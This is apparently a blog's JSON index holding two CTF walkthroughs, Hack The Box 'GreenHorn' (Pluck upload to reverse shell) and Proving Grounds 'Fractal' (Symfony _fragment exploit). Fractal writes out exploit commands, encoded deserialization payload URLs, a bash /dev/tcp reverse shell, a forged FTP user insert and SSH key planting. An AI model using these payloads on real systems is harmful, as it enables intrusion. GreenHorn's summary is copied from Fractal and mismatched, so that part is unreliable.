[
  
  {
    "title": "Hack The Box - GreenHorn",
    "url": "/posts/HackTheBox-Greenhorn/",
    "categories": "CTF, Hack The Box - Play",
    "tags": "EASY, Linux, Web, Gitea",
    "date": "2025-01-05 00:00:00 -0300",
    





    
    "snippet": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensi...",
    "content": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensitive files and obtaining database credentials.Using these credentials, a Symfony exploit script was executed to achieve Remote Code Execution (RCE) and gain a reverse shell.Privilege escalation involved creating a new user via MySQL, allowing SSH access with elevated privileges, eventually leading to root access.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[HTTP Enumeration]    B --&gt;|Identify Pluck| C[Explore Pluck Profiler]    C --&gt;|Find Sensitive Files| D[Exploit Pluck]    D --&gt;|Obtain Credentials| E[Use Credentials for login pluck profile]    E --&gt;|RCE| F[Reverse Shell]    F --&gt;|Privilege Escalation| G[PDF credentials]    G --&gt;|Login Root| H[Root Credentials]Information GatheringPort Scan      nmap -Pn 10.10.11.25      EnumerationHTTP 80      http://10.10.11.25/            Há um direcionamento para: greenhorn.htb            Edição do /etc/hosts            Acessando a página Web            Nome da possível aplicação:            Ao clicar em “admin” conseguimos entrar no campo de login      HTTP 3000      Na porta 3000 encontramos uma aplicação Gitea, contendo o versionamento da aplicação (código fonte).            Selecionando o botão “Explore” conseguimos encontrar o código fonte da página.              Em GreenHorn/data/settings Podemos encontrar informações da aplicação.        $sitetitle = ‘GreenHorn’;  $email = ‘admin@greenhorn.htb’;        Foi obtido também um hash:          &lt;?php  $ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';  ?&gt;            Utilizando o hashes.com foi possível obter o valor do hash e encontrar a senha para o acesso.      Exploitation  Utilizando a porta 3000, foi utilizado a credencial encontrada para acessar a conta de admin.Foi encontrado uma vuln na versão do sistema pluck 4.7.18 na qual permite o FLI no parâmetro que não realiza a higienização do arquivo que está sendo incluído. caminho do parâmetro:http://greenhorn.htb/admin.php?action=installmodulefonte: fonte: https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC/blob/main/poc.pyFoi encontrado esse exploit, porém não foi utilizado.No parâmetro informado (http://greenhorn.htb/admin.php?action=installmodule), pudemos encontrar um local para subir arquivos.  Foi selecionado um reverseshell.php para realizar o upload na aplicação e tentar o shell reverso.      Após selecionar a aplicação, foi colocado o shell de ataque para ouvir na porta determinada no reverse shell.            Na hora de fazer o upload do arquivo, foi encontrado um erro na execução.      Foi constatado que a aplicação só aceita o arquivo .zip.      Convertendo o shell para .zip:            O upload foi realizado com sucesso.      Assim que foi realizado o upload do arquivo, foi obtida a shell inicial do alvo.Na referencia a qual foi utilizada  para realizar o ataque, pode-se observar um caminho onde possivelmente estaria a shell.  Não foi possível acessar o conteúdo do host com a conta www-data.Sendo assim, vamos tentar utilizar a credencial encontrada ( iloveyou1 ) para acessar o usuário junior.      Foi obtido sucesso ao acessar a conta.      d4f9ddc90d984468af21edc53b4fd0e5  Priv Escalation      Podemos verificar que há um pdf na conta.            Após realizar o download do arquivo, foi possível observar que o arquivo está pixelado no local da senha.      Para despixelar foi utilizado o https://github.com/spipm/Depix.gitNo entando, para utilizar o sistema, precisamos de transforma-lo em png. Para isso foi utilizado o site https://tools.pdf24.org/en/extract-images?source=post_page—–e87e1cc07864——————————–Resultado:sidefromsidetheothersidesidefromsidetheotherside      Utilizando a credencial encontrada:            Encontrando a flag:        064255efb0e058760e060b915e547f42  "
  },
  
  {
    "title": "Proving Grounds - Fractal",
    "url": "/posts/Proving-Grounds-Fractal/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, Symfony, MySQL",
    "date": "2024-07-10 00:00:00 -0300",
    





    
    "snippet": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensi...",
    "content": "Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.The Symfony profiler was explored, leading to finding sensitive files and obtaining database credentials.Using these credentials, a Symfony exploit script was executed to achieve Remote Code Execution (RCE) and gain a reverse shell.Privilege escalation involved creating a new user via MySQL, allowing SSH access with elevated privileges, eventually leading to root access.Diagramgraph TD    A[Host Enumeration] --&gt;|Nmap Scan| B[HTTP Enumeration]    B --&gt;|Identify Symfony| C[Explore Symfony Profiler]    C --&gt;|Find Sensitive Files| D[Exploit Symfony]    D --&gt;|Obtain Database Credentials| E[Use Symfony Exploit Script]    E --&gt;|RCE| F[Reverse Shell]    F --&gt;|Privilege Escalation| G[Create user via MySQL]    G --&gt;|Create User| H[SSH Access]    H --&gt;|User Benoit| I[Root Access]Information GatheringPort Scan      nmap -sS -Pn -n --open -p- -T4 192.168.192.233            nmap -sVC -p 21,22,80 192.168.192.233      EnumerationHTTP 80      http://192.168.192.233/            http://192.168.192.233/robots.txt → CMS symfony 3.4      I Forced an error to appear      http://192.168.192.233/app_dev.php/randomfile        http://192.168.192.233/app_dev.php/_profiler/empty/search/results?limit=10      https://github.com/symfony/symfony/issues/28002            Profile Token      Accessed as if it were an admin panel.      http://192.168.192.233/app_dev.php/_profiler/c7b124      Checking the branch on GitHub, it is possible to view documentation about upgrading Symfony 3.x, so we might find sensitive files.      https://github.dev/symfony/symfony/tree/3.4      Then I decided to investigate the _profiler to find directories since I tried passing it as a URL and got nothing. I filtered by all these statuses to avoid issues.  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.233/app_dev.php/_profiler/FUZZ -fs 47400,47401,47402,47403,47404,47405,47406,47407,47408,47409,47410,47411,47412,47413,47414,47415,47416,47417,47418,47419,47420,47421,47422,47423,47424,47425,47426,47427,47428,47429,47430,47431,47432,47433,47434,47435,47436,47437,47438,47439,47440,47441,47442,47443,47444,47445,47446,47447,47448,47449,47450,47451,47452,47453,47454,47455,47456,47457,47458,47459,47460,47461,47462,47463,47464,47465,47466,47467,47468,47469,47470,47471,47472,47473,47474,47475,47476,47477,47478,47479,47480,47481,47482,47483,47484,47485,47486,47487,47488,47489,47490,47491,47492,47493,47494,47495,47496,47497,47498,47499Found 2 directories “latest” and “open”Investigating the latest had nothing…Says the file is not readable. So, I will try to read the file found “.yml” on GitHub.      http://192.168.192.233/app_dev.php/_profiler/open            ffuf -u http://192.168.192.233/app_dev.php/_profiler/open?FUZZ=app/config/parameters.yml -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -fs 5522 → Found “file”      Now accessing the URL, I’ve found Database credentials.      http://192.168.192.233/app_dev.php/_profiler/open?file=app/config/parameters.yml      ExploitationSearching a lot, I found the following article https://al1z4deh.medium.com/how-i-hacked-28-sites-at-once-rce-5458211048d5  https://raw.githubusercontent.com/ambionics/symfony-exploits/main/secret_fragment_exploit.pyInside it, there is an exploit from a fragment. I tried to enumerate the secret but found nothing.      python3 secret_fragment_exploit.py http://192.168.192.233/_fragment      Then I decided to use the secret found in the database.      python3 secret_fragment_exploit.py 'http://192.168.192.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.192.233/_fragment' --function system --parameters \"id\"      Now accessing the generated URL. I was able to execute commands.      http://192.168.192.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522id%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&amp;_hash=11%2FxvG%2BUpm6nlv7maKqSHFIXdN0BjTshxq568sphXaU%3D            python3 secret_fragment_exploit.py '[http://192.168.192.233/_fragment](http://192.168.192.233/_fragment)' \\--method 2 \\--secret '48a8538e6260789558f0dfe29861c05b' \\--algo 'sha256' \\--internal-url '[http://192.168.192.233/_fragment](http://192.168.192.233/_fragment)' \\--function system \\--parameters \"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.227/80 0&gt;&amp;1'\"        http://192.168.192.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A52%253A%2522bash%2B-c%2B%2527bash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252F192.168.45.227%252F80%2B0%253E%25261%2527%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&amp;_hash=PC7%2FGws9sawDouQ0AzUn3VpCDiEZhuUcPt01QQOMvx4%3D      rlwrap nc -lvnp 80            local.txt      Priv Escalation      cat /etc/passwd → there is the user benoit      I previously obtained access to database information, let’s check and access it.      netstat -nlpt      I tried to access MySQL with the credentials obtained earlier but failed. Then I looked for cron, kernel version, SSH, etc., but found nothing. So I decided to look at the FTP configuration files.      ls -lah /etc/proftpd            cat sql.conf      Let’s connect to SQL.      mysql -u proftpd -p proftpd : protfpd_with_MYSQL_password →      It seems to have a password for www to access proftpd. FTP authentication through ProFTPDI will create a new password for the user benoit who already exists in the system.In the {md5} base64-encoded format. Therefore, the right way to generate a password for the user benoit is to use the base64-encoded MD5 hash method.  /bin/echo \"{md5}\"/bin/echo -n \"hendrich\" | openssl dgst -binary -md5 | openssl enc -base64      INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`) VALUES (NULL, 'benoit', '{md5}wZjbZseC3NVjPeEobwukRg==', 1000, 1000, '/', '/bin/bash', 0, NOW(), NOW());      Now logging into FTP      ftp 192.168.192.233 benoit:hendrich            ssh-keygen        cp id_rsa.pub authorized_keys  mkdir .ssh      put authorized_keys            ssh -i id_rsa benoit@192.168.192.233            sudo -l → has permission to execute everything. sudo su works            flag      "
  }
  
]

